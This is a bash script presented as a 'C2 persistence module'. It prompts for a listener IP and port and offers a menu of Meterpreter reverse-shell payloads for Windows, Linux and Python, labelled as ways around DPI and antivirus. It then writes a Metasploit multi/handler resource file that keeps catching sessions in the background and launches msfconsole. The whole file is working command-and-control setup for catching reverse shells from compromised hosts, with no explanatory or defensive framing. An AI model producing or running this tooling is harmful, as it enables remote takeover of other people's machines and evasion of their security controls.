#!/bin/bash

# ==============================================================================
# MISSION:   Persistent Shell Catching & Session Management
# ==============================================================================

RED='\033[1;31m'
GRN='\033[1;32m'
YEL='\033[1;33m'
CYN='\033[0;36m'
NC='\033[0m'

banner() {
    clear
    echo -e "${RED}  ██████╗██████╗     ██████╗ ██████╗ "
    echo " ██╔════╝╚════██╗    ██╔════╝╚════██╗"
    echo " ██║      █████╔╝    ██║      █████╔╝"
    echo " ██║     ██╔═══╝     ██║     ██╔═══╝ "
    echo " ╚██████╗███████╗    ╚██████╗███████╗"
    echo -e "  ╚═════╝╚══════╝     ╚═════╝╚══════╝${NC}"
    echo -e "${CYN}      [ C2 PERSISTENCE MODULE ]${NC}"
}

setup_c2() {
    echo -e "\n${YEL}[+] CONFIGURING PERSISTENT LISTENER:${NC}"
    read -p ">> Set Listener IP (Your IP/VPS): " LHOST
    read -p ">> Set Listener Port (Default 4444): " LPORT
    LPORT=${LPORT:-4444}

    echo -e "\n${YEL}[+] SELECT PAYLOAD TYPE:${NC}"
    echo "1. Windows Meterpreter Reverse TCP (Standard)"
    echo "2. Windows Meterpreter Reverse HTTPS (Bypass DPI)"
    echo "3. Linux Reverse TCP (Generic)"
    echo "4. Python Reverse Hex (AV Bypass)"
    read -p ">> Selection: " P_CHOICE

    case $P_CHOICE in
        1) PAYLOAD="windows/x64/meterpreter/reverse_tcp" ;;
        2) PAYLOAD="windows/x64/meterpreter/reverse_https" ;;
        3) PAYLOAD="linux/x64/meterpreter/reverse_tcp" ;;
        4) PAYLOAD="python/meterpreter/reverse_tcp" ;;
    esac

    # Generate the Resource Script for MSF
    C2_RC="s3rp_c2_handler.rc"
    {
        echo "use exploit/multi/handler"
        echo "set PAYLOAD $PAYLOAD"
        echo "set LHOST $LHOST"
        echo "set LPORT $LPORT"
        echo "set ExitOnSession false"      # Keeps listener alive after a shell drops
        echo "set EXITFUNC thread"          # Stability
        echo "exploit -j -z"                # Run as background job, don't interact immediately
    } > "$C2_RC"

    echo -e "\n${GRN}[+] C2 Configuration saved to $C2_RC${NC}"
    echo -e "${CYN}[*] Launching MSF Handler...${NC}"
    
    # Launching MSF
    msfconsole -q -r "$C2_RC"
}

banner
setup_c2
